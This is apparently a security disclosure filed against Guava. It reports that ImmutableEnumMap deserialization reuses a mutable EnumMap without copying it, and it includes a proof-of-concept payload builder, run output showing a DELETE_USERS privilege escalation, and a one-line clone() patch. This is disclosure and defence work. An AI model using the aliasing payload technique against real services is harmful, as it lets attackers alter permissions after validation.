### Guava Version

latest code

### Description

## Report description
ImmutableEnumMap deserialization can allow post-validation permission changes

## The problem
### Please describe the technical details of the vulnerability

#### 1. technical details

`ImmutableEnumMap` is Guava's specialized immutable map implementation for enum keys. For maps with
two or more entries, `asImmutable()` wraps the supplied `EnumMap` directly:

```java
final class ImmutableEnumMap<K extends Enum<K>, V> extends IteratorBasedImmutableMap<K, V> {
  static <K extends Enum<K>, V> ImmutableMap<K, V> asImmutable(EnumMap<K, V> map) {
    switch (map.size()) {
      case 0:
        return ImmutableMap.of();
      case 1:
        Entry<K, V> entry = getOnlyElement(map.entrySet());
        return ImmutableMap.of(entry.getKey(), entry.getValue());
      default:
        return new ImmutableEnumMap<>(map);
    }
  }

  private final transient EnumMap<K, V> delegate;

  private ImmutableEnumMap(EnumMap<K, V> delegate) {
    this.delegate = delegate;
    checkArgument(!delegate.isEmpty());
  }
```

The immutable map's observable state is read from that delegate:

```java
  @Override
  public int size() {
    return delegate.size();
  }

  @Override
  public boolean containsKey(@Nullable Object key) {
    return delegate.containsKey(key);
  }

  @Override
  public @Nullable V get(@Nullable Object key) {
    return delegate.get(key);
  }
```

During serialization, `ImmutableEnumMap` uses a serialization proxy that stores the same `EnumMap`
delegate:

```java
  @Override
  @J2ktIncompatible // serialization
  Object writeReplace() {
    return new EnumSerializedForm<>(delegate);
  }

  @J2ktIncompatible // serialization
  private static final class EnumSerializedForm<K extends Enum<K>, V> implements Serializable {
    final EnumMap<K, V> delegate;

    EnumSerializedForm(EnumMap<K, V> delegate) {
      this.delegate = delegate;
    }

    Object readResolve() {
      return new ImmutableEnumMap<>(delegate);
    }
  }
```

The issue is that `readResolve()` constructs the deserialized `ImmutableEnumMap` with the proxy's
mutable `EnumMap` delegate without making a defensive copy. A crafted serialized object graph can
include both:

- an `ImmutableEnumMap` that is reconstructed from this delegate, and
- another application-visible field that references the same `EnumMap`.

After deserialization, writes through the mutable `EnumMap` field change the already validated
`ImmutableMap`. This violates the immutable snapshot contract that callers rely on after accepting
an `ImmutableMap` from deserialization.

Guava already uses the defensive pattern in the analogous `ImmutableEnumSet` serialization proxy:

```java
private static final class EnumSerializedForm<E extends Enum<E>> implements Serializable {
  final EnumSet<E> delegate;

  Object readResolve() {
    // EJ2 #76: Write readObject() methods defensively.
    return new ImmutableEnumSet<E>(delegate.clone());
  }
}
```

#### 2. vulnerability reproduction

The reproduction is implemented in:

```text
./work/guava/ImmutableEnumMapTest
```

The test models a role-restore endpoint that receives one serialized request object. The request
contains an approved immutable permission snapshot and a separate mutable draft map used for review:

```java
private static final class RoleRestoreRequest implements Serializable {
  private final ImmutableMap<AdminPermission, Decision> approvedPermissions;
  private final EnumMap<AdminPermission, Decision> draftPermissionChanges;
  private final AdminPermission requestedPermission;
  private final Decision requestedDecision;
}
```

The service first validates the approved immutable snapshot:

```java
RoleRestoreRequest request;
try (ObjectInputStream input =
    new ObjectInputStream(new ByteArrayInputStream(serializedRequest))) {
  request = (RoleRestoreRequest) input.readObject();
}

ImmutableMap<AdminPermission, Decision> approvedPermissions = request.approvedPermissions;

Decision decisionDuringValidation = approvedPermissions.get(AdminPermission.DELETE_USERS);
if (decisionDuringValidation == Decision.ALLOW) {
  throw new SecurityException("Uploaded roles must not already grant DELETE_USERS.");
}
```

It then records the requested change in the mutable draft map. This draft write is not supposed to
affect the validated immutable permission snapshot:

```java
request.draftPermissionChanges.put(request.requestedPermission, request.requestedDecision);

Decision decisionDuringAuthorization = approvedPermissions.get(AdminPermission.DELETE_USERS);
boolean deleteUsersExecuted =
    decisionDuringAuthorization == Decision.ALLOW && executeDeleteUsersMaintenanceTask();
```

The malicious payload makes `draftPermissionChanges` reference the same `EnumMap` delegate that the
deserialized `ImmutableEnumMap` uses internally:

```java
EnumMap<AdminPermission, Decision> initialPermissions = new EnumMap<>(AdminPermission.class);
initialPermissions.put(AdminPermission.VIEW_AUDIT_LOGS, Decision.ALLOW);
initialPermissions.put(AdminPermission.DELETE_USERS, Decision.DENY);

ImmutableMap<AdminPermission, Decision> approvedPermissions =
    ImmutableMap.copyOf(initialPermissions);
EnumMap<AdminPermission, Decision> immutableMapDelegate =
    extractImmutableEnumMapDelegate(approvedPermissions);

RoleRestoreRequest maliciousRequest =
    new RoleRestoreRequest(
        approvedPermissions,
        immutableMapDelegate,
        AdminPermission.DELETE_USERS,
        Decision.ALLOW);
```

The reflection in the payload generator is only used to build the local serialized object graph for
the test. The service receives and processes ordinary serialized bytes and reads one top-level
business object.

Run the reproduction:

```bash
cd ./work/guava
./ImmutableEnumMapTest/scripts/run.sh
```

Observed output:

```text
Security validation observed DELETE_USERS=DENY
Authorization later observed DELETE_USERS=ALLOW
Privileged DELETE_USERS operation executed=true
Impact: validation passed, but the immutable permission snapshot changed.
```

The archived reproduction is available at:

```text
./work/guava/ImmutableEnumMapTest.tar.gz
```

SHA-256:

```text
53848c8cc76048676725354951d0c5d7599b783e90cac4e3634235a3f0a89dff
```

#### 3. patch

Clone the serialized `EnumMap` delegate before constructing the deserialized `ImmutableEnumMap`.
This breaks the attacker-controlled object graph alias while preserving the existing enum-key map
behavior.

```diff
diff --git a/android/guava/src/com/google/common/collect/ImmutableEnumMap.java b/android/guava/src/com/google/common/collect/ImmutableEnumMap.java
index e53a04e..5963616 100644
--- a/android/guava/src/com/google/common/collect/ImmutableEnumMap.java
+++ b/android/guava/src/com/google/common/collect/ImmutableEnumMap.java
@@ -121,7 +121,7 @@ final class ImmutableEnumMap<K extends Enum<K>, V> extends IteratorBasedImmutabl
     }

     Object readResolve() {
-      return new ImmutableEnumMap<>(delegate);
+      return new ImmutableEnumMap<>(delegate.clone());
     }

     @GwtIncompatible @J2ktIncompatible private static final long serialVersionUID = 0;
diff --git a/guava/src/com/google/common/collect/ImmutableEnumMap.java b/guava/src/com/google/common/collect/ImmutableEnumMap.java
index 7238a06..0ed5d73 100644
--- a/guava/src/com/google/common/collect/ImmutableEnumMap.java
+++ b/guava/src/com/google/common/collect/ImmutableEnumMap.java
@@ -142,7 +142,7 @@ final class ImmutableEnumMap<K extends Enum<K>, V> extends IteratorBasedImmutabl
     }

     Object readResolve() {
-      return new ImmutableEnumMap<>(delegate);
+      return new ImmutableEnumMap<>(delegate.clone());
     }

     @GwtIncompatible @J2ktIncompatible private static final long serialVersionUID = 0;
```

### Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so

An attacker who can submit a serialized object graph accepted by an application's restore/import
path can make a mutable `EnumMap` field alias the internal delegate of a deserialized
`ImmutableEnumMap`. If the application validates the immutable map and later updates the mutable map
as draft or metadata state, the update can change the already validated immutable permission
snapshot.

In the demonstrated permission workflow, the attacker submits a role restore request where
`DELETE_USERS` is denied during validation. The later draft update changes the same permission in the
validated immutable snapshot to `ALLOW`, so the authorization step executes the privileged
`DELETE_USERS` operation.

This should not be classified as Not An Issue under the stated principle. Given the triggering
capability, the attacker can provide request data that is still subject to the service's validation
and normal approval workflow. That capability does not itself grant the approved `DELETE_USERS`
permission, because the approved permission snapshot is checked before use. The additional effect
introduced by this bug is the ability to mutate that approved immutable snapshot after the security
check by writing through a separate mutable field in the same deserialized object graph.

[ImmutableEnumMapTest.tar.gz](https://github.com/user-attachments/files/27164935/ImmutableEnumMapTest.tar.gz)

